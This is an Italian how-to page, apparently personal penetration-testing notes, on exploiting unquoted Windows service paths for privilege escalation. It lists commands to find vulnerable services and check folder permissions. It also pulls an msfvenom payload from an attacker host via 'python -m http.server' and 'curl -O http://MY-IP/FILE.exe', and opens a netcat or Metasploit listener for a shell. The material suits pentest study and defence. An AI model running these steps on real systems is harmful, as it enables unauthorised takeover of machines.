<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Unquoted Service Path</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Unquoted Service Path</h1><br/><p>Attacco che può essere effettuato solo dopo aver trovato delle credenziali e avuto accesso ad una macchina.</p><p><ol><li>1) <strong><span style="color:#071ba3;">1) Identifichiamo i servizi con startup automatico usando il seguente comando powershell:</span></strong></li></ol></p><p></p><p><h3>Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike &quot;C:\Windows*&quot; -and $_.PathName -notlike &#39;&quot;*&#39;} | select Name,DisplayName,StartMode,PathName</h3></p><p><ol><li>2) <strong><span style="color:#071ba3;">2) Se troviamo un servizio con un path senza apici come il seguente:</span></strong></p><p></li></ol><img src="images/131-1.png" alt="images/131-1.png" /></p><p></p><p><em>possiamo verificare i dettagli del servizio e la possibilità di scrivere in quella cartella. Lo facciamo attraverso cmd:</em></p><p></p><p>sc qc “SERVIZIO”</p><p></p><p>icacls “C:\PATH”</p><p><ol><li>3) <strong><span style="color:#071ba3;">3) Se la risposta è positiva, accediamo alla cartella con l&#39;eseguibile.</span></strong></li></ol><strong></strong></p><p><strong></strong><ol><li><strong>4) </strong><strong><span style="color:#071ba3;">4) Possiamo provare ad effettuare l&#39;attacco (che potrebbe permetterci un privilege scalation):</span></strong></li></ol></p><p></p><p><em>creiamo un eseguibile il cui nome inizierà con le prime lettere del nome della Directory. Es:</em></p><p><img src="images/131-2.png" alt="images/131-2.png" /></p><p></p><p><em>Per creare il payload possiamo usare msfvenom.</em><em></em></p><p><em></em><em></em></p><p><em>Una volta creato, lo carichiamo sulla macchina target con</em> <span style="color:#ff0000;">python -m http.server 8080</span> <em>lato attacker, e</em> <span style="color:#ff0000;">curl -O </span><a href="http://MY-IP/FILE.exe">http://MY-IP/FILE.exe</a> <em>lato target.</em></p><p><ol><li>5) <strong><span style="color:#071ba3;">5) Avviamo il listener</span></strong> <em>(possiamo usare metasploit con</em> <span style="color:#ff0000;">exploit/multi/handler</span> <em>inserendo i dati payload, lhost e lport</em>;<em> oppure possiamo semplicemente usare netcat con</em> <span style="color:#ff0000;">nc -nlvp PORT</span>)</li></ol></p><p><ol><li>6) <strong><span style="color:#071ba3;">6) Se tutto è andato liscio, al successivo avvio della macchina target, dovremmo avere una shell privilegiata.</span></strong></li></ol></p></div>
</body>
</html>
